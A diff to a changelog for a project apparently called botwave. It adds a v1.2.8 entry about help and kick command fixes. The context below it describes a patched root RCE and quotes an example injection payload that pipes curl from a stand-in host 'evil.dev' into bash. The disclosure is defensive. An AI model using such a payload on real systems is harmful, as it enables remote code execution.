@@ -14,6 +14,13 @@
 # - Release description: detailed information about the release
 # - =--- END ---=: marks the end of the release 
 
+=--- v1.2.8-nymania ---=
+### What Changed
+- **Improved `help` command**: Help is now more detailed. Running help [command] [command2] [...] shows full details for one or more specific commands, including a description, examples, and related environment variables. Running `help` alone only shows a list of available commands (including [custom commands](https://github.com/dpipstudio/botwave/wiki/Creating-custom-commands))
+- **Fixed `kick` command**: The `kick` command previously crashes due to a race condition. The issue is now fixed.
+
+=--- END ---=
+
 =--- v1.2.7-ilex ---=
 ### What Changed
 - **Fixed potential RCE vuln on `bw-client`**: `bw-client` allowed arbitrary content executed in a regular shell via the `update` command. This allowed attacker to send custom-crafted commands such as `UPDATE args="idk && curl evil.dev | bash` that will be executed as root. This update patches this by not spawning a shell at all (and doing some stricter validation).
